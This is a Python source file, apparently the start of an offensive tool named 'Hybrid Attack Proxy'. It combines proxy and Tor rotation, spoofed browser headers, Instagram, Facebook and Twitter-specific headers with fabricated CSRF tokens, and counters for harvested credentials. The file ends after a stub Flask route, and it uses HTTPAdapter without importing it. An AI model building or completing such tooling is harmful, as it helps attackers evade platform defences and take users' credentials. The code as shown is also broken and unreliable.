import requests
import threading
import time
import random
import sys
import socket
import ssl
from urllib.parse import urlparse
import subprocess
import platform
import os
import uuid
import base64
import json
from http.client import HTTPConnection, HTTPSConnection
import queue
import socks
import stem.process
from stem import Signal
from stem.control import Controller
from flask import Flask, request, render_template_string
import zlib
import gzip
from io import BytesIO
import re
import hashlib
import hmac
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class HybridAttackProxy:
    def __init__(self):
        self.stop_event = threading.Event()
        self.proxy_queue = queue.Queue()
        self.attacker_threads = []
        self.proxy_threads = []
        self.session = requests.Session()
        self.session.mount('http', HTTPAdapter(max_retries=3))
        self.session.mount('https', HTTPAdapter(max_retries=3))
        self.user_agents = self.load_user_agents()
        self.proxy_list = self.load_proxy_list()
        self.current_proxy_index = 0
        self.app = Flask(__name__)
        self.setup_routes()
        self.target_url = None
        self.harvested_credentials = []
        self.stats = {
            'requests_sent': 0,
            'requests_failed': 0,
            'credentials_harvested': 0,
            'start_time': None
        }
        
    def load_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
    
    def load_proxy_list(self):
        """Load proxy list from file or use default ones"""
        default_proxies = [
            # Add your proxy list here
            # Format: ['http://ip:port', 'socks5://ip:port', ...]
            'http://proxy1.example.com:8080',
            'socks5://proxy2.example.com:1080',
        ]
        
        # Try to load from file
        try:
            with open('proxies.txt', 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
                if proxies:
                    logger.info(f"Loaded {len(proxies)} proxies from file")
                    return proxies
        except FileNotFoundError:
            logger.info("No proxies.txt found, using default proxies")
        
        return default_proxies
    
    def get_random_proxy(self):
        """Get a random proxy from the list"""
        if not self.proxy_list:
            return None
        
        # Rotate through proxies
        proxy = self.proxy_list[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        
        return {'http': proxy, 'https': proxy}
    
    def generate_random_headers(self, target_domain=None):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            ]),
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9,en-US;q=0.8',
                'en-US,en;q=0.8',
                'en-US,en;q=0.9,en;q=0.8',
            ]),
            'Accept-Encoding': random.choice([
                'gzip, deflate, br',
                'gzip, deflate',
                'gzip, deflate, br, zstd',
            ]),
            'DNT': random.choice(['1', '0']),
            'Connection': random.choice(['keep-alive', 'close']),
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script', 'style']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
            'Pragma': 'no-cache',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
            'Sec-Ch-Ua': random.choice([
                '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
                '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            ]),
            'Sec-Ch-Ua-Mobile': random.choice(['?0', '?1']),
            'Sec-Ch-Ua-Platform': random.choice([
                '"Windows"',
                '"macOS"',
                '"Linux"',
                '"Android"',
                '"iOS"',
            ]),
        }
        
        # Add domain-specific headers
        if target_domain:
            if 'instagram.com' in target_domain:
                headers.update({
                    'X-IG-App-ID': '936619743392459',
                    'X-ASBD-ID': '198387',
                    'X-IG-WWW-Claim': '0',
                    'X-Requested-With': 'XMLHttpRequest',
                })
            elif 'facebook.com' in target_domain:
                headers.update({
                    'X-FB-Friendly-Sign': 'aW52YWxpZCBzaWduYXR1cmU=',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-Logger': 'X-FB-Client-Logger',
                })
            elif 'twitter.com' in target_domain:
                headers.update({
                    'X-Twitter-Active-User': 'yes',
                    'X-Twitter-Client-Language': 'en',
                    'X-CSRF-Token': self.generate_csrf_token(),
                })
        
        return headers
    
    def generate_csrf_token(self):
        """Generate a random CSRF token"""
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
    
    def setup_routes(self):
        """Setup Flask routes for the proxy interface"""
        
        @self.app.route('/')
        def index():
            return render_template_string('''
            <html>
            <head><title>Proxy Interface</title></head>
            <body><h1>Hybrid Attack Proxy</h1></body>
            </html>
            ''')
